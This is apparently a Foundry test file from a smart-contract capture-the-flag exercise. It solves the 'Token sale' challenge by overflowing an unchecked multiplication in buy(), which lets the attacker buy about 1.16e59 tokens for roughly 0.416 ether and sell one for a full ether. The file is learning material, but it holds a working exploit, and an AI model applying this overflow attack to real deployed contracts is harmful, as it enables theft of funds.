// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {TokenSale} from "src/TokenSale.sol";

// #6 Token sale — buy() menghitung total dalam `unchecked`:
// numTokens * 1 ether bisa overflow. Pilih numTokens = ceil(2^256/1e18)
// sehingga total = 1e18 - (2^256 mod 1e18) = 415992086870360064 wei
// (~0,416 ether). Beli ~1,16e59 token murah, jual 1 token -> 1 ether.
contract TokenSaleSolve is Test {
    TokenSale challenge;

    uint256 constant NUM_TOKENS = 115792089237316195423570985008687907853269984665640564039458;
    uint256 constant TOTAL_WEI = 415992086870360064;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new TokenSale{value: 1 ether}();
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
    }

    function testSolve() public {
        uint256 total = challenge.buy{value: TOTAL_WEI}(NUM_TOKENS);
        assertEq(total, TOTAL_WEI);
        assertGe(challenge.balanceOf(address(this)), 1);
        challenge.sell(1);
        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
